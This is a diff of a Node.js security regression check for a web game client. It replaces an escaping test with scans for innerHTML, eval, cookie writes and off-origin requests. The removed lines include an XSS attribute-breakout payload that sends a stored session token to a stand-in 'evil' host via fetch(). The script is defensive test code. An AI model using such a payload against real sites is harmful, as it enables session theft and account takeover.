@@ -2,11 +2,20 @@
 /**
  * Too Many Coins - Client Security Self-Check
  *
- * Guards the client-side fixes in public/js/app.js against regression.
+ * Guards the security properties of the rebuilt client (public/js/main.js,
+ * core/*, screens/*).
  *
- * Unlike a hand-written stub, this extracts the REAL escapeHtml source out of
- * app.js and executes it, so the test cannot silently drift from the shipped
- * implementation.
+ * This check used to extract escapeHtml() out of the legacy app.js and run it
+ * against attribute-breakout payloads. That client is gone, and the rebuilt
+ * one does not have an escaping function — deliberately. It never builds
+ * markup from strings at all: core/render.js creates elements and sets text
+ * through createTextNode/`data`, so player-controlled values reach the DOM as
+ * text nodes and attribute values, never as parsed HTML.
+ *
+ * That is a stronger guarantee than escaping, but only while it holds. So the
+ * checks below assert the ABSENCE of the sinks rather than the correctness of
+ * an escaper: one innerHTML in a screen would reintroduce the entire class of
+ * bug that escapeHtml existed to contain.
  *
  * Usage:  node tools/client_security_selfcheck.js
  * Exit:   0 = pass, 1 = fail
@@ -16,8 +25,22 @@ const fs = require('fs');
 const path = require('path');
 const assert = require('assert');
 
-const appPath = path.join(__dirname, '..', 'public', 'js', 'app.js');
-const src = fs.readFileSync(appPath, 'utf8');
+const ROOT = path.join(__dirname, '..', 'public', 'js');
+
+/** Every client source file, with its repo-relative name. */
+function clientSources(dir = ROOT, out = []) {
+    for (const entry of fs.readdirSync(dir, { withFileTypes: true })) {
+        const full = path.join(dir, entry.name);
+        if (entry.isDirectory()) clientSources(full, out);
+        else if (entry.name.endsWith('.js')) {
+            out.push({ file: path.relative(ROOT, full), src: fs.readFileSync(full, 'utf8') });
+        }
+    }
+    return out;
+}
+
+const sources = clientSources();
+const all = sources.map(s => s.src).join('\n');
 
 const failures = [];
 function check(name, fn) {
@@ -30,84 +53,103 @@ function check(name, fn) {
     }
 }
 
-// ---- extract the real escapeHtml implementation ---------------------------
-const match = src.match(/escapeHtml\(str\)\s*\{[\s\S]*?\n    \},/);
-if (!match) {
-    console.error('Could not locate escapeHtml() in app.js - update this check.');
-    process.exit(1);
+/** Files where a pattern appears, ignoring comment lines. */
+function hits(re) {
+    const found = [];
+    for (const { file, src } of sources) {
+        src.split('\n').forEach((line, i) => {
+            const code = line.replace(/^\s*(\/\/|\*|\/\*).*$/, '');
+            if (re.test(code)) found.push(`${file}:${i + 1}`);
+        });
+    }
+    return found;
 }
-const escapeHtml = new Function(
-    'return function ' + match[0].replace(/,$/, '') + ';'
-)();
 
 console.log('Client security self-check');
 console.log('-'.repeat(60));
+console.log(`  (${sources.length} client source files)`);
 
-// ---- escapeHtml must be safe in ATTRIBUTE context, not just text ----------
-// A textContent -> innerHTML round-trip escapes & < > but NOT quotes, so any
-// value interpolated into value="..." could break out of the attribute. The
-// staff panel renders another player's profile_status exactly that way.
-check('escapeHtml escapes double quotes', () => {
-    assert.ok(!escapeHtml('a"b').includes('"'), 'raw double quote survived');
+let checks = 0;
+const guard = (name, fn) => { checks++; check(name, fn); };
+
+// ---- no HTML sinks -------------------------------------------------------
+// The reconciler is the only thing that touches the DOM, and it writes text,
+// not markup. Every sink below parses its input as HTML, so any one of them
+// turns a chat message or a handle back into an injection vector.
+
+guard('no innerHTML / outerHTML assignment anywhere in the client', () => {
+    const found = hits(/\.(inner|outer)HTML\s*=/);
+    assert.strictEqual(found.length, 0, 'HTML sink found at ' + found.join(', '));
 });
 
-check('escapeHtml escapes single quotes', () => {
-    assert.ok(!escapeHtml("a'b").includes("'"), 'raw single quote survived');
+guard('no insertAdjacentHTML / document.write', () => {
+    const found = hits(/insertAdjacentHTML|document\.write/);
+    assert.strictEqual(found.length, 0, 'HTML sink found at ' + found.join(', '));
 });
 
-check('escapeHtml escapes angle brackets and ampersand', () => {
-    const out = escapeHtml('<img>&');
-    assert.ok(!out.includes('<') && !out.includes('>'), 'raw angle bracket survived');
-    assert.strictEqual(escapeHtml('&').includes('&amp;'), true);
+guard('no eval or Function constructor', () => {
+    const found = hits(/\beval\s*\(|new Function\s*\(/);
+    assert.strictEqual(found.length, 0, 'dynamic code execution at ' + found.join(', '));
 });
 
-check('attribute breakout payload is neutralised', () => {
-    // The real-world payload: 76 chars, under the 80-char profile_status limit.
-    const payload = '" autofocus onfocus="fetch(\'//evil/\'+localStorage.tmc_token)';
-    const rendered = 'value="' + escapeHtml(payload) + '"';
-    // After the opening value=" there must be exactly one more unescaped quote:
-    // the closing one. Anything else means the attribute was escapable.
-    const quoteCount = (rendered.match(/"/g) || []).length;
-    assert.strictEqual(quoteCount, 2, 'payload introduced extra unescaped quotes');
-    assert.ok(!rendered.includes('onfocus="'), 'injected event handler survived');
-});
-
-check('escapeHtml preserves benign text', () => {
-    assert.strictEqual(escapeHtml('Hello world 123'), 'Hello world 123');
-});
-
-check('escapeHtml falsy handling is unchanged', () => {
-    // Deliberately identical to the pre-fix behaviour so the security change did
-    // not silently alter rendering anywhere that passes 0/null/undefined.
-    assert.strictEqual(escapeHtml(''), '');
-    assert.strictEqual(escapeHtml(null), '');
-    assert.strictEqual(escapeHtml(undefined), '');
-    assert.strictEqual(escapeHtml(0), '');
-});
-
-// ---- the client must not strip HttpOnly from the session cookie -----------
-check('client never writes the session token to document.cookie', () => {
-    const writes = src.match(/document\.cookie\s*=\s*[^;\n]*tmc_session=\$\{[^}]+\}/g) || [];
-    assert.strictEqual(
-        writes.length, 0,
-        'found ' + writes.length + ' client-side session cookie write(s); these replace the ' +
-        'server HttpOnly cookie with a script-readable one'
-    );
-});
-
-// ---- 403 is permission-denied, not a dead session ------------------------
-check('403 does not trigger logout', () => {
-    const logoutGuard = src.match(/if \(resp\.status === 401[^)]*\)[^{]*\{\s*\n\s*this\.handleLoggedOut\(\);/);
-    assert.ok(logoutGuard, 'could not locate the logout guard - update this check');
+guard('the reconciler sets text as data, not markup', () => {
+    const render = sources.find(s => s.file.endsWith('render.js'));
+    assert.ok(render, 'core/render.js not found');
     assert.ok(
-        !/resp\.status === 403/.test(logoutGuard[0]),
-        'a 403 (staff/admin permission denied) still force-logs-out the player'
+        /createTextNode/.test(render.src),
+        'render.js no longer creates text nodes - it may be building markup instead'
     );
+});
+
+// ---- session handling ----------------------------------------------------
+// The server sets an HttpOnly session cookie. Rewriting it from script
+// replaces it with a script-readable one and silently undoes that protection.
+
+guard('client never writes the session cookie', () => {
+    const found = hits(/document\.cookie\s*=/);
+    assert.strictEqual(found.length, 0, 'client-side cookie write at ' + found.join(', '));
+});
+
+guard('403 does not force a logout', () => {
+    const api = sources.find(s => s.file.endsWith('api.js'));
+    assert.ok(api, 'core/api.js not found');
+    // 401 means the session is gone; 403 means this account may not do that
+    // thing. Treating 403 as a dead session logs staff out of their own tools.
+    assert.ok(/401/.test(api.src), 'no 401 handling found - update this check');
+    const unauthorizedBlocks = api.src.match(/status\s*===\s*401[^\n]*/g) || [];
+    assert.ok(
+        !unauthorizedBlocks.some(line => /403/.test(line)),
+        'a 403 is treated as an expired session'
+    );
+});
+
+// ---- transport -----------------------------------------------------------
+
+guard('no third-party origins are contacted from the client', () => {
+    // Same rule the CSP enforces for images, applied to every request the
+    // client could make: anything off-origin either fails closed or leaks.
+    const found = hits(/(fetch|open)\s*\(\s*['"`]https?:\/\//);
+    assert.strictEqual(found.length, 0, 'off-origin request at ' + found.join(', '));
+});
+
+guard('the stored token is only ever sent as a header', () => {
+    // Putting it in a query string writes the credential into access logs,
+    // Referer headers and browser history.
+    const found = hits(/[?&](token|session)=\$\{/);
+    assert.strictEqual(found.length, 0, 'token in a URL at ' + found.join(', '));
+});
+
+// ---- staff surfaces ------------------------------------------------------
+
+guard('staff-only screens are gated on the server-published role', () => {
+    const main = sources.find(s => s.file === 'main.js');
+    assert.ok(/player\.role === 'Admin'|player\.role === 'Moderator'/.test(main.src),
+        'staff gating no longer reads the server role');
 });
 
 console.log('-'.repeat(60));
 if (failures.length === 0) {
-    console.log('Result: PASS (' + 8 + ' checks)');
+    console.log(`Result: PASS (${checks} checks)`);
     process.exit(0);
 }
 console.log('Result: FAIL - ' + failures.length + ' check(s) failed');
